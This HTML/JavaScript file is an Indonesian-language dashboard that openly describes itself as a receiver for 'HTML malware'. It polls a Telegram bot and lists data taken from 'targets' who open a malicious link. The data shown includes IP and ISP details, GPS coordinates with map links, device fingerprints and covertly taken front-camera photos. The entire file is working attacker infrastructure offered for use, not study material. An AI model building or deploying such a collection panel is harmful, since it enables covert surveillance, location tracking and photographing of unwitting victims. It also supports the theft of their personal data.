<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎯 Panel Data Target - Receiver</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'Segoe UI', Arial, sans-serif; }
        body { background: #0a0e17; color: #e6edf3; min-height: 100vh; padding: 15px; }

        .header {
            background: linear-gradient(135deg, #1e40af, #7c3aed, #ec4899);
            border-radius: 14px; padding: 20px; text-align: center;
            margin-bottom: 15px; box-shadow: 0 8px 30px rgba(124, 58, 237, 0.4);
            position: relative; overflow: hidden;
        }
        .header::before {
            content: ''; position: absolute; top: -50%; left: -50%;
            width: 200%; height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
            animation: pulse 4s infinite;
        }
        @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.1); } }
        .header h1 { font-size: 24px; margin-bottom: 6px; position: relative; z-index: 1; }
        .header p { font-size: 13px; opacity: 0.9; position: relative; z-index: 1; }

        .status-bar {
            display: flex; align-items: center; justify-content: space-between;
            background: #111827; border: 1px solid #1f2937; border-radius: 10px;
            padding: 12px 16px; margin-bottom: 15px; flex-wrap: wrap; gap: 10px;
        }
        .status-left { display: flex; align-items: center; gap: 10px; font-size: 13px; }
        .dot {
            width: 10px; height: 10px; border-radius: 50%; background: #ef4444;
            box-shadow: 0 0 10px #ef4444; animation: blink 1.5s infinite;
        }
        .dot.active { background: #22c55e; box-shadow: 0 0 10px #22c55e; }
        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }

        .status-right { display: flex; gap: 8px; }
        .btn-sm {
            padding: 8px 14px; border-radius: 8px; border: none;
            font-size: 12px; font-weight: bold; cursor: pointer;
            transition: 0.2s; color: #fff;
        }
        .btn-sm.blue { background: #1f6feb; }
        .btn-sm.green { background: #22c55e; }
        .btn-sm.red { background: #ef4444; }
        .btn-sm:hover { transform: translateY(-2px); opacity: 0.9; }

        /* CONFIG PANEL */
        .config-panel {
            background: #111827; border: 1px solid #1f2937; border-radius: 12px;
            padding: 16px; margin-bottom: 15px;
        }
        .config-panel h3 { font-size: 14px; color: #a78bfa; margin-bottom: 12px; }
        .config-grid { display: grid; grid-template-columns: 1fr; gap: 10px; }
        @media(min-width: 600px) { .config-grid { grid-template-columns: 1fr 1fr auto; } }
        .config-panel input {
            width: 100%; padding: 10px 12px; background: #0a0e17;
            border: 1px solid #1f2937; border-radius: 8px;
            color: #e6edf3; font-size: 13px;
        }
        .config-panel input:focus { outline: none; border-color: #7c3aed; }
        .config-panel button {
            padding: 10px 20px; background: #7c3aed; color: #fff;
            border: none; border-radius: 8px; cursor: pointer;
            font-weight: bold; font-size: 13px;
        }

        /* STATS */
        .stats {
            display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 10px; margin-bottom: 15px;
        }
        .stat-card {
            background: linear-gradient(135deg, #111827, #1f2937);
            border: 1px solid #1f2937; border-radius: 12px;
            padding: 15px; text-align: center;
        }
        .stat-card .num {
            font-size: 26px; font-weight: bold;
            background: linear-gradient(135deg, #a78bfa, #ec4899);
            -webkit-background-clip: text; background-clip: text;
            -webkit-text-fill-color: transparent;
            color: transparent;
        }
        .stat-card .label { font-size: 11px; color: #94a3b8; margin-top: 4px; }

        /* LIST DATA */
        .data-list { display: flex; flex-direction: column; gap: 12px; }

        .data-card {
            background: #111827; border: 1px solid #1f2937;
            border-radius: 12px; overflow: hidden;
            animation: slideIn 0.5s ease;
        }
        @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .data-header {
            background: linear-gradient(90deg, #1e40af, #7c3aed);
            padding: 12px 16px; display: flex; justify-content: space-between;
            align-items: center; flex-wrap: wrap; gap: 8px;
        }
        .data-header h3 { font-size: 14px; }
        .data-header .time { font-size: 11px; opacity: 0.85; }

        .data-body { padding: 16px; }

        .section-title {
            font-size: 12px; color: #a78bfa; font-weight: bold;
            margin: 12px 0 8px; text-transform: uppercase;
            letter-spacing: 0.5px; display: flex; align-items: center; gap: 6px;
        }
        .section-title:first-child { margin-top: 0; }

        .row {
            display: flex; justify-content: space-between;
            padding: 7px 0; border-bottom: 1px solid #1f2937;
            font-size: 13px; gap: 10px;
        }
        .row:last-child { border-bottom: none; }
        .row .label { color: #94a3b8; flex-shrink: 0; }
        .row .val {
            color: #e6edf3; font-weight: 500; text-align: right;
            word-break: break-all; max-width: 65%;
        }
        .row .val.link { color: #38bdf8; cursor: pointer; text-decoration: underline; }

        .foto-box {
            margin-top: 10px; border-radius: 10px; overflow: hidden;
            border: 2px solid #7c3aed; max-width: 100%;
        }
        .foto-box img { width: 100%; display: block; }

        .empty {
            text-align: center; padding: 40px 20px;
            color: #64748b; font-size: 14px;
        }
        .empty .icon { font-size: 48px; margin-bottom: 10px; }

        .new-badge {
            display: inline-block; padding: 2px 8px; background: #ef4444;
            color: #fff; font-size: 10px; border-radius: 10px;
            font-weight: bold; animation: blink 1s infinite;
        }

        .toast {
            position: fixed; bottom: 20px; right: 20px;
            background: #22c55e; color: #fff; padding: 12px 20px;
            border-radius: 10px; font-size: 13px; font-weight: bold;
            box-shadow: 0 10px 30px rgba(34, 197, 94, 0.4);
            transform: translateY(200%); transition: transform 0.3s;
            z-index: 999;
        }
        .toast.show { transform: translateY(0); }
    </style>
</head>
<body>

    <!-- HEADER -->
    <div class="header">
        <h1>🎯 Panel Data Target</h1>
        <p>Real-time receiver dari HTML malware</p>
    </div>

    <!-- STATUS BAR -->
    <div class="status-bar">
        <div class="status-left">
            <span class="dot" id="statusDot"></span>
            <span id="statusText">Terputus dari Telegram</span>
        </div>
        <div class="status-right">
            <button class="btn-sm blue" onclick="muatUlangData()">🔄 Refresh</button>
            <button class="btn-sm red" onclick="hapusSemua()">🗑 Hapus</button>
        </div>
    </div>

    <!-- CONFIG PANEL -->
    <div class="config-panel">
        <h3>⚙️ Konfigurasi Bot Telegram</h3>
        <div class="config-grid">
            <input type="text" id="cfgToken" placeholder="Bot Token (contoh: 7712...:AAH...)" />
            <input type="text" id="cfgChatId" placeholder="Chat ID (contoh: 123456789)" />
            <button onclick="simpanConfig()">💾 Simpan & Hubungkan</button>
        </div>
    </div>

    <!-- STATS -->
    <div class="stats">
        <div class="stat-card">
            <div class="num" id="statTotal">0</div>
            <div class="label">📊 Total Data</div>
        </div>
        <div class="stat-card">
            <div class="num" id="statToday">0</div>
            <div class="label">📅 Hari Ini</div>
        </div>
        <div class="stat-card">
            <div class="num" id="statWithFoto">0</div>
            <div class="label">📷 Ada Foto</div>
        </div>
        <div class="stat-card">
            <div class="num" id="statWithGPS">0</div>
            <div class="label">📍 Ada GPS</div>
        </div>
    </div>

    <!-- DATA LIST -->
    <div class="data-list" id="dataList">
        <div class="empty">
            <div class="icon">📭</div>
            <div>Belum ada data masuk</div>
            <div style="margin-top:8px; font-size:12px;">Data akan muncul otomatis ketika ada target yang mengakses link</div>
        </div>
    </div>

    <!-- TOAST -->
    <div class="toast" id="toast">✅ Data baru masuk!</div>

    <script>
        // ============================================
        // CONFIG
        // ============================================
        let TOKEN = localStorage.getItem('rx_token') || '';
        let CHAT_ID = localStorage.getItem('rx_chatid') || '';
        let lastUpdateId = parseInt(localStorage.getItem('rx_lastUpdate') || '0');
        let pollingInterval = null;
        let dataStore = JSON.parse(localStorage.getItem('rx_data') || '[]');

        // ============================================
        // SIMPAN CONFIG
        // ============================================
        function simpanConfig() {
            const t = document.getElementById('cfgToken').value.trim();
            const c = document.getElementById('cfgChatId').value.trim();

            if (!t || !c) {
                alert('Token & Chat ID wajib diisi!');
                return;
            }

            TOKEN = t; CHAT_ID = c;
            localStorage.setItem('rx_token', t);
            localStorage.setItem('rx_chatid', c);

            document.getElementById('statusDot').classList.add('active');
            document.getElementById('statusText').textContent = 'Terhubung ke Telegram';
            mulaiPolling();
            tampilkanData();
        }

        // ============================================
        // LOAD CONFIG SAAT DIBUKA
        // ============================================
        window.addEventListener('DOMContentLoaded', () => {
            if (TOKEN) document.getElementById('cfgToken').value = TOKEN;
            if (CHAT_ID) document.getElementById('cfgChatId').value = CHAT_ID;

            if (TOKEN && CHAT_ID) {
                document.getElementById('statusDot').classList.add('active');
                document.getElementById('statusText').textContent = 'Terhubung ke Telegram';
                mulaiPolling();
            }

            tampilkanData();
        });

        // ============================================
        // POLLING TELEGRAM getUpdates
        // ============================================
        function mulaiPolling() {
            if (pollingInterval) clearInterval(pollingInterval);
            cekUpdate();
            pollingInterval = setInterval(cekUpdate, 3000);
        }

        async function cekUpdate() {
            if (!TOKEN || !CHAT_ID) return;

            try {
                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=0`);
                const data = await res.json();

                if (!data.ok) {
                    document.getElementById('statusDot').classList.remove('active');
                    document.getElementById('statusText').textContent = 'Error: ' + data.description;
                    return;
                }

                if (data.result && data.result.length > 0) {
                    document.getElementById('statusDot').classList.add('active');
                    document.getElementById('statusText').textContent = `Terhubung · ${data.result.length} update baru`;

                    for (const upd of data.result) {
                        lastUpdateId = Math.max(lastUpdateId, upd.update_id);
                        prosesUpdate(upd);
                    }
                    localStorage.setItem('rx_lastUpdate', lastUpdateId);
                    tampilkanData();
                }
            } catch (err) {
                document.getElementById('statusDot').classList.remove('active');
                document.getElementById('statusText').textContent = 'Gagal koneksi: ' + err.message;
            }
        }

        // ============================================
        // PROSES UPDATE DARI TELEGRAM
        // ============================================
        function prosesUpdate(upd) {
            const msg = upd.message || upd.edited_message;
            if (!msg) return;

            // Filter hanya dari chat_id yang ditentukan
            if (String(msg.chat.id) !== String(CHAT_ID)) return;

            // Skip pesan keluar (dari bot sendiri)
            if (msg.from && msg.from.is_bot) return;

            // ===== TEKS =====
            if (msg.text && !msg.text.startsWith('/')) {
                const item = {
                    id: upd.update_id,
                    tipe: 'text',
                    teks: msg.text,
                    waktu: new Date(msg.date * 1000).toLocaleString('id-ID'),
                    timestamp: msg.date,
                    foto: null,
                    parsed: parseTextData(msg.text)
                };
                simpanItem(item);
            }

            // ===== FOTO =====
            if (msg.photo && msg.photo.length > 0) {
                const fileId = msg.photo[msg.photo.length - 1].file_id;
                const caption = msg.caption || 'Foto tanpa caption';

                getFileUrl(fileId).then(url => {
                    const item = {
                        id: upd.update_id,
                        tipe: 'foto',
                        teks: caption,
                        waktu: new Date(msg.date * 1000).toLocaleString('id-ID'),
                        timestamp: msg.date,
                        foto: url,
                        parsed: parseTextData(caption)
                    };
                    simpanItem(item);
                    tampilkanData();
                });
            }
        }

        // ============================================
        // GET URL FOTO DARI TELEGRAM
        // ============================================
        async function getFileUrl(fileId) {
            try {
                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getFile?file_id=${fileId}`);
                const data = await res.json();
                if (data.ok) {
                    return `https://api.telegram.org/file/bot${TOKEN}/${data.result.file_path}`;
                }
            } catch (e) {}
            return null;
        }

        // ============================================
        // PARSE TEKS DATA
        // ============================================
        function parseTextData(text) {
            const result = {};
            const lines = text.split('\n');
            for (const line of lines) {
                const m = line.match(/^[•·]\s*(.+?)\s*:\s*(.+)$/);
                if (m) {
                    const key = m[1].trim().replace(/[^\w\s]/g, '').trim();
                    result[key] = m[2].trim();
                }
            }
            return result;
        }

        // ============================================
        // SIMPAN ITEM
        // ============================================
        function simpanItem(item) {
            // Cek duplikat
            if (dataStore.find(d => d.id === item.id)) return;
            dataStore.unshift(item); // yang baru di atas
            if (dataStore.length > 200) dataStore = dataStore.slice(0, 200);
            localStorage.setItem('rx_data', JSON.stringify(dataStore));
            showToast();
        }

        // ============================================
        // TAMPILKAN DATA
        // ============================================
        function tampilkanData() {
            const list = document.getElementById('dataList');

            if (dataStore.length === 0) {
                list.innerHTML = `
                    <div class="empty">
                        <div class="icon">📭</div>
                        <div>Belum ada data masuk</div>
                        <div style="margin-top:8px; font-size:12px;">Data akan muncul otomatis ketika ada target yang mengakses link</div>
                    </div>`;
                updateStats();
                return;
            }

            let html = '';
            for (const item of dataStore) {
                html += renderCard(item);
            }
            list.innerHTML = html;
            updateStats();
        }

        // ============================================
        // RENDER CARD
        // ============================================
        function renderCard(item) {
            const p = item.parsed || {};
            const isNew = (Date.now() / 1000 - item.timestamp) < 300; // 5 menit terakhir

            let body = '';

            // Section: Informasi IP
            const ipKeys = ['IP Publik', 'ISP', 'Negara', 'Provinsi', 'Kota', 'Kode Pos', 'Timezone', 'Koordinat IP', 'IP Address'];
            const ipRows = ipKeys.filter(k => p[k]).map(k => renderRow(k, p[k])).join('');
            if (ipRows) body += `<div class="section-title">🌐 Informasi IP</div>${ipRows}`;

            // Section: Lokasi GPS
            const gpsKeys = ['Latitude', 'Longitude', 'Akurasi', 'Maps', 'Alamat Perkiraan'];
            const gpsRows = gpsKeys.filter(k => p[k]).map(k => renderRow(k, p[k], k === 'Maps')).join('');
            if (gpsRows) body += `<div class="section-title">📍 Lokasi GPS</div>${gpsRows}`;

            // Section: Perangkat
            const devKeys = ['Platform', 'Nama HP / Platform', 'Sistem Operasi', 'Browser', 'Tipe Browser', 'User Agent', 'Bahasa', 'Layar', 'Resolusi Layar', 'Warna', 'Kedalaman Warna', 'CPU', 'Jumlah CPU', 'RAM', 'RAM Perangkat', 'Status', 'Status Koneksi'];
            const devRows = devKeys.filter(k => p[k]).map(k => renderRow(k, p[k])).join('');
            if (devRows) body += `<div class="section-title">📱 Informasi Perangkat</div>${devRows}`;

            // Section: Waktu
            if (p['Waktu Akses']) body += `<div class="section-title">🕐 Waktu Akses</div>${renderRow('Waktu Akses', p['Waktu Akses'])}`;

            // Kalau tidak ada yang ke-parse, tampilkan raw text
            if (!body && item.teks) {
                body = `<div class="section-title">📄 Raw Data</div><div style="font-size:12px; color:#94a3b8; white-space:pre-wrap; word-break:break-word;">${escapeHtml(item.teks)}</div>`;
            }

            // Foto
            if (item.foto) {
                body += `<div class="section-title">📷 Foto Kamera Depan</div><div class="foto-box"><img src="${item.foto}" alt="foto target" onerror="this.style.display='none'"></div>`;
            }

            return `
                <div class="data-card">
                    <div class="data-header">
                        <h3>🎯 Target ${item.tipe === 'foto' ? '(Foto)' : ''} ${isNew ? '<span class="new-badge">BARU</span>' : ''}</h3>
                        <span class="time">${item.waktu}</span>
                    </div>
                    <div class="data-body">${body}</div>
                </div>
            `;
        }

        function renderRow(label, val, isLink = false) {
            const safeVal = escapeHtml(String(val));
            if (isLink || /^https?:\/\//.test(val)) {
                return `<div class="row"><span class="label">${escapeHtml(label)}</span><span class="val"><a href="${safeVal}" target="_blank" style="color:#38bdf8;">${safeVal}</a></span></div>`;
            }
            return `<div class="row"><span class="label">${escapeHtml(label)}</span><span class="val">${safeVal}</span></div>`;
        }

        function escapeHtml(str) {
            return str.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
        }

        // ============================================
        // STATS
        // ============================================
        function updateStats() {
            document.getElementById('statTotal').textContent = dataStore.length;

            const today = new Date().toDateString();
            const todayCount = dataStore.filter(d => new Date(d.timestamp * 1000).toDateString() === today).length;
            document.getElementById('statToday').textContent = todayCount;

            const withFoto = dataStore.filter(d => d.foto).length;
            document.getElementById('statWithFoto').textContent = withFoto;

            const withGPS = dataStore.filter(d => d.parsed && (d.parsed['Latitude'] || d.parsed['GPS Latitude'])).length;
            document.getElementById('statWithGPS').textContent = withGPS;
        }

        // ============================================
        // MUAT ULANG
        // ============================================
        function muatUlangData() {
            if (!TOKEN) { alert('Isi config dulu!'); return; }
            cekUpdate();
            tampilkanData();
        }

        // ============================================
        // HAPUS SEMUA
        // ============================================
        function hapusSemua() {
            if (!confirm('Hapus semua data?')) return;
            dataStore = [];
            localStorage.setItem('rx_data', '[]');
            localStorage.setItem('rx_lastUpdate', '0');
            lastUpdateId = 0;
            tampilkanData();
        }

        // ============================================
        // TOAST
        // ============================================
        let toastTimeout;
        function showToast() {
            const t = document.getElementById('toast');
            t.classList.add('show');
            clearTimeout(toastTimeout);
            toastTimeout = setTimeout(() => t.classList.remove('show'), 3000);
        }
    </script>
</body>
</html>
